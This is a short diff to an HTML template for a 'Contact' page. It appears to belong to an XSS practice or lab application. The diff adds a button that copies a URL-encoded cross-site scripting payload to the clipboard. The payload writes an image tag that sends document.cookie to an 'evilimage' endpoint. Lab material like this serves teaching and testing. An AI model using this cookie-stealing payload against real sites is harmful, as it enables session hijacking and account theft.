@@ -4,6 +4,14 @@
     <head>
     {% set title = 'Contact' %}
     {% include 'b_head.html' %}
+
+    <script>
+        function addToClipboard() {
+        var copyText = "%3Cscript%3E%20%0Adocument.write('%3Cimg%20src=%22{{ domain }}evilimage?get='+escape(document.cookie)+'%22%3E');%0A%3C/script%3E";
+        navigator.clipboard.writeText(decodeURI(copyText));
+        } 
+    </script>
+
     </head>
 
     <body>
@@ -45,7 +53,7 @@
                                 </div>
                             </form>
                             <div class="register">
-                                <p><a href="/xssadmin"><i class="ik ik-arrow-left"></i> Go back</a></p>
+                                <p><a href="/xssadmin"><i class="ik ik-arrow-left"></i> Go back</a> | <a href="#" onclick="addToClipboard()"><i class="ik ik-clipboard"></i> Add to clipboard</a></p>
                             </div>
                         </div>
                     </div>
